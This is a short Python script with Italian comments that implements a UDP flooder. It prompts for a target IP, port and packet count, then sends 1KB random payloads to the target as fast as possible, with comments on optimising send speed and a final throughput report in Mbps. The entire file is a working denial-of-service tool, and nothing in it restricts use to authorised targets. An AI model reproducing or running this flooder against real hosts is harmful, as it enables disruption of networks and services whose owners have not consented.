import socket
import random
import sys
import time

def udp_flooder_optimized():
    print("--- UDP Packet Sender (Ottimizzato) ---")

    target_ip = input("IP Target: ")
    try:
        target_port = int(input("Porta Target: "))
        packet_count = int(input("Numero pacchetti: "))
    except ValueError:
        print("Errore: Inserire numeri interi.")
        sys.exit(1)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # OTTIMIZZAZIONE 1: Generiamo il payload UNA volta sola prima del ciclo.
    # Inviare sempre gli stessi byte è molto più efficiente per la CPU.
    payload = random.randbytes(1024) 

    print(f"\nInvio di {packet_count} pacchetti da 1KB verso {target_ip}:{target_port}...")
    print("Premi CTRL+C per interrompere manualmente se necessario.\n")

    start_time = time.time()
    sent_packets = 0

    try:
        for i in range(packet_count):
            # Invio del payload pre-calcolato
            sock.sendto(payload, (target_ip, target_port))
            sent_packets += 1

            # OTTIMIZZAZIONE 2: Non stampiamo nulla nel ciclo critico.
            # (Opzionale: stampa ogni 5000 pacchetti per non bloccare l'IO)
            #if sent_packets % 5000 == 0:
            #    print(f"Inviati {sent_packets} pacchetti...", end='\r')

    except KeyboardInterrupt:
        print("\nInterrotto dall'utente.")
    except Exception as e:
        print(f"\nErrore: {e}")

    duration = time.time() - start_time
    sock.close()

    print(f"\n\n--- Fine ---")
    print(f"Pacchetti totali: {sent_packets}")
    if duration > 0:
        print(f"Tempo impiegato: {duration:.2f} secondi")
        # Calcolo della velocità approssimativa in Mbps
        # (sent_packets * 1024 byte * 8 bit) / duration / 1.000.000
        mbps = (sent_packets * 1024 * 8) / duration / 1_000_000
        print(f"Velocità stimata: {mbps:.2f} Mbps")

if __name__ == "__main__":
    udp_flooder_optimized()